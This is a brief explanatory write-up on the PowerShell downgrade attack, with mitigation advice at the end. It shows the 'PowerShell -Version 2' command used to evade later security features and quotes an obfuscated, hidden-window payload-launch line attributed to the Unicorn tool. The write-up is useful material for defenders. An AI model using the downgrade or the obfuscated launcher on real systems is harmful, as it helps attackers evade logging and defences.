# PowerShell Downgrade Attack

The PowerShell downgrade attack is a simple technique that allows attackers to modify the current PowerShell version to remove security features.

Most PowerShell sessions start with the most recent engine, but attackers can manually change the version. By downgrading PowerShell to version 2.0, they can bypass security features introduced in later versions (notably version 5.0).

## Attack Example

Attackers can launch a new PowerShell process specifying the version:

```powershell
PowerShell -Version 2
```

This technique is actively exploited in tools such as Unicorn.

Example payload:

```python
full_attack = '''powershell /w 1 /C "sv {0} -;sv {1} ec;sv {2} ((gv {3}).value.toString()+(gv {4}).value.toString());powershell (gv {5}).value.toString() (\\''''.format(ran1, ran2, ran3, ran1, ran2, ran3) + haha_av + ")" + '"'
```

## Detection and Mitigation

Since this attack is straightforward, there are many ways for defenders to detect and mitigate it.

**Mitigations:**
- Remove the PowerShell 2.0 engine from devices.
- Deny access to PowerShell 2.0 via application blocklisting.